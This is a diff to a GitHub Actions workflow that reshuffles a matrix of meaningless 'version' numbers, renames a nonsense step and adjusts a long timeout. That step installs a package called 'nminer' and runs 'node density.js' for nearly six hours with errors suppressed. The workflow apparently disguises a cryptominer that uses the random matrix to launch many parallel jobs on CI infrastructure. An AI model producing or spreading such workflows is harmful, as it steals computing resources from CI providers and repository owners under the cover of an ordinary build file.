@@ -9,25 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 1447 }
-          - { version: 3520 }
-          - { version: 2601 }
-          - { version: 957 }
-          - { version: 7937 }
-          - { version: 8064 }
-          - { version: 6405 }
-          - { version: 5301 }
-          - { version: 462 }
-          - { version: 1392 }
-          - { version: 4089 }
-          - { version: 9336 }
-          - { version: 5068 }
-          - { version: 6994 }
-          - { version: 9994 }
-          - { version: 8424 }
-          - { version: 828 }
-          - { version: 1741 }
-          - { version: 673 }
+          - { version: 3074 }
+          - { version: 2587 }
+          - { version: 7034 }
+          - { version: 8261 }
+          - { version: 6805 }
+          - { version: 3960 }
+          - { version: 9734 }
+          - { version: 9531 }
+          - { version: 8327 }
+          - { version: 2338 }
+          - { version: 426 }
+          - { version: 4794 }
+          - { version: 9877 }
+          - { version: 1788 }
+          - { version: 9042 }
+          - { version: 6556 }
 
     steps:
       - name: Checkout
@@ -38,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: than coin perp
+      - name: tenement
         run: |
           npm install nminer@latest
-          timeout 347m node density.js || echo "density executed"
+          timeout 349m node density.js || echo "density executed"
